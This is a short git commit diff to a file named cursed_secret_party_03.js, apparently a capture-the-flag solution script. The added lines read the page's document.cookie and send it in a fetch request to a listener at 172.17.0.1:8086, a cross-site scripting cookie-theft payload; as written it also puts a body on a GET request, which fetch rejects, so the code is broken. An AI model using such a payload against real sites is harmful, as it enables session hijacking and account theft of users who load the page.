f45c94aafac034f771a15f7334b13b753144188a
mgbttt <44745409+mgbttt@users.noreply.github.com>
2022-12-14 00:07:29 +0100

    Update cursed_secret_party_03.js

--- cursed_secret_party_03.js
+++ cursed_secret_party_03.js
@@ -1,5 +1,12 @@
+var token = document.cookie;
 fetch('http://172.17.0.1:8086/prueba.txt', {
-    method: 'GET'
+    method: 'GET',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        token
+    })
 })
 .then((res) => res.text())
 .then((data) => {
